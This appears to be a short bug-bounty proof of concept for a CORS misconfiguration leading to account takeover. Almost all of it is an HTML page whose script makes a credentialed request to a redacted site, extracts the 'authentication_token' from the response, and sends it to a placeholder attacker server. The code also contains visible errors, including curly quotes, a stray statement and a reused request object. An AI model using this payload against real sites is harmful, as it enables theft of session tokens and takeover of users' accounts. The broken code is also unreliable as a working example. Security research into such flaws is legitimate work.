Missing CORS leads to Complete Account Takeover

<!DOCTYPE html>
<html>
<body onload = “loadDoc(‘https://www.redacted.com', myFunction)”>
<div id=”demo”>
<h2>Your account is taken over by <b><i>Jordin</i></b></h2><script>
function loadDoc(url, cFunction) {
 var xhttp;
 xhttp=new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 cFunction(this);
 }
 };
 xhttp.open(“GET”, url, true);
 xhttp.withCredentials = true;
 xhttp.send();
}
function myFunction(xhttp) {
 // document.getElementById(“demo”).innerHTML =
 // xhttp.responseText;
 var xhttp1;
 xhttp1=new XMLHttpRequest();
 xhttp1.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 1
 }
 };
 var content = xhttp.responseText;
 var n = content.indexOf(“authentication_token”)
 //Change the url here to attacker controlled server
 url = “https://attacker-server-url.com/" + content.substring(n,);xhttp.open(“GET”, url, true);
 xhttp.withCredentials = true;
 xhttp.send();
}
</script>
</body>
</html>
                                                  
https://nirajmodi51.medium.com/missing-cors-leads-to-complete-account-takeover-1ed4b53bf9f2                                                
